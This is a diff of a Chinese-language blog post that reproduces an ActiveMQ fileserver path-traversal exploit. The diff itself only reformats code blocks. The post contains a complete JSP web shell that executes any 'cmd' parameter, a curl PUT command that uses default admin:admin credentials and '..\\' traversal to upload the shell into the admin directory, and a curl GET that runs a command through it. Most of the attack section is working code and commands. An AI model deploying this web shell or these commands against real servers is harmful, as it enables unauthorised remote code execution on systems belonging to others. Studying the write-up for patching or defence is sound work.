@@ -22,16 +22,41 @@
 <p>访问<a target="_blank" rel="noopener" href="http://localhost:8161/admin/1.jsp?cmd=ls">http://localhost:8161/admin/1.jsp?cmd=ls</a> ，命令成功执行，效果如下</p>
 <p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyydn04gj30m80dg75v.jpg" alt="img"></p>
 <h4 id="4-我的复现过程"><a href="#4-我的复现过程" class="headerlink" title="4.我的复现过程"></a>4.我的复现过程</h4><p>1.首先编写一个cmd.js，内容主要如下：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span>%&gt;  </span><br><span class="line"> &lt;%  </span><br><span class="line"> %&gt;  </span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;  </span><br><span class="line"> Commands with JSP  </span><br><span class="line"> &lt;FORM METHOD=<span class="string">&quot;GET&quot;</span> NAME=<span class="string">&quot;myform&quot;</span> ACTION=<span class="string">&quot;&quot;</span>&gt;  </span><br><span class="line"> &lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;cmd&quot;</span>&gt;  </span><br><span class="line"> &lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Send&quot;</span>&gt;  </span><br><span class="line"> &lt;/FORM&gt;  </span><br><span class="line"> &lt;pre&gt;  </span><br><span class="line"> &lt;%  </span><br><span class="line"> <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;  </span><br><span class="line"> out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;&lt;BR&gt;&quot;</span>);  </span><br><span class="line"> Process p = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));  </span><br><span class="line"> OutputStream os = p.getOutputStream();  </span><br><span class="line"> InputStream in = p.getInputStream();  </span><br><span class="line"> DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);  </span><br><span class="line"> String disr = dis.readLine();  </span><br><span class="line"> <span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;  </span><br><span class="line"> out.println(disr);  </span><br><span class="line"> disr = dis.readLine();  </span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line"> %&gt;  </span><br><span class="line"> &lt;/pre&gt;  </span><br><span class="line"> &lt;/BODY&gt;&lt;/HTML&gt;  </span><br></pre></td></tr></table></figure>
+<pre><code class="jsp">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;  
+ &lt;%  
+ %&gt;  
+ &lt;HTML&gt;&lt;BODY&gt;  
+ Commands with JSP  
+ &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;  
+ &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;  
+ &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;  
+ &lt;/FORM&gt;  
+ &lt;pre&gt;  
+ &lt;%  
+ if (request.getParameter(&quot;cmd&quot;) != null) &#123;  
+ out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);  
+ Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));  
+ OutputStream os = p.getOutputStream();  
+ InputStream in = p.getInputStream();  
+ DataInputStream dis = new DataInputStream(in);  
+ String disr = dis.readLine();  
+ while ( disr != null ) &#123;  
+ out.println(disr);  
+ disr = dis.readLine();  
+ &#125;  
+ &#125;  
+ %&gt;  
+ &lt;/pre&gt;  
+ &lt;/BODY&gt;&lt;/HTML&gt;  </code></pre>
 <p>将其放置在cmd的默认路径下，默认一般是：C:\Users\用户名 或者C:\Users\admin</p>
 <p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzo65f57j30la0dwwgv.jpg" alt="截屏2020-02-02下午1.25.39"></p>
 <p>打开cmd，利用”..\”的便利目录漏洞，输入如下命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u admin:admin -v -X PUT --data &quot;@cmd.jsp&quot; http://TARGET:8161/fileserver/..\\admin\\cmd.jsp</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">curl -u admin:admin -v -X PUT --data &quot;@cmd.jsp&quot; http://TARGET:8161/fileserver/..\\admin\\cmd.jsp</code></pre>
 <p>两个admin是默认的服务用户名和密码</p>
 <p>该条命令直接把cmd.jsp上传到admin的目录下</p>
 <p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzt9c2zlj30la0dwaco.jpg" alt="截屏2020-02-02下午1.30.30"></p>
 <p>在cmd中利用curl用GET直接利用命令：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u admin:admin -v -X GET http://TARGET:8161/admin/cmd.jsp?cmd=calc.exe</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">curl -u admin:admin -v -X GET http://TARGET:8161/admin/cmd.jsp?cmd=calc.exe</code></pre>
 <p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzx6nio1j30la0dwjtm.jpg" alt="截屏2020-02-02下午1.34.00"></p>
 <p>可以看到成功弹出计算器，利用成功</p>
 </article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/01/30/WinDbg/" title="WinDbg初步学习总结与简单实战"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: WinDbg初步学习总结与简单实战</span></a><a class="button is-default" href="/2021/01/30/XSS%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/" title="跨站脚本攻击（XSS）知识点"><span class="has-text-weight-semibold">下一页: 跨站脚本攻击（XSS）知识点</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/haojen"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> Fstark 2021</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
